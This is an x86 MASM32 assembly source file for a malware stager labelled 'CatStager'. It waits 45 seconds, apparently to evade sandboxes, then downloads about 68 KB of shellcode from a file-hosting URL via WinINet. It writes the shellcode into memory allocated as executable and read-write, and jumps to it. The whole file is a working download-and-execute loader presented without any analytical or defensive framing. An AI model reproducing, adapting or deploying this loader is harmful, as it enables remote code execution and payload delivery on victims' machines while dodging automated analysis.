.386
.model flat, stdcall
option casemap :none   


include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\wininet.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\wininet.lib
includelib \masm32\lib\msvcrt.lib 

printf PROTO C :DWORD, :VARARG 

.data
    useragent db "CatStager",0
    url db "https://files.catbox.moe/n5bq6r.cat",0
    hInternet dd ?
    hConnect dd ?
    hRequest dd ?
    hMemory dd ?
    shellcodeSize dd 68605 
    strInternetOpen db "Initializing WinINet...%n",0
    strInternetOpenUrl db "Connecting to server...%n",0
    strVirtualAlloc db "Allocating memory...%n",0
    strInternetReadFile db "Reading shellcode...%n",0
    strExecuteShellcode db "Executing shellcode...%n",0
    bytesRead dd ?

.code
start:
    invoke Sleep, 45000  

    invoke printf, addr strInternetOpen
    invoke InternetOpen, addr useragent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0
    cmp eax, NULL
    je _exit
    mov hInternet, eax

    invoke printf, addr strInternetOpenUrl
    invoke InternetOpenUrl, hInternet, addr url, NULL, 0, INTERNET_FLAG_RELOAD, 0
    cmp eax, NULL
    je _closeInternet
    mov hRequest, eax

    invoke printf, addr strVirtualAlloc
    invoke VirtualAlloc, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE
    cmp eax, NULL
    je _closeRequest
    mov hMemory, eax

    invoke printf, addr strInternetReadFile

    mov ecx, shellcodeSize

    mov ebx, hRequest  
    mov edi, hMemory  
    invoke InternetReadFile, ebx, edi, ecx, offset bytesRead

    
    invoke InternetCloseHandle, ebx

    
    invoke printf, addr strExecuteShellcode
    call hMemory

    
    invoke VirtualFree, hMemory, 0, MEM_RELEASE

    _closeRequest:
    invoke InternetCloseHandle, hRequest
    _closeInternet:
    invoke InternetCloseHandle, hInternet

    _exit:
    invoke ExitProcess,0
end start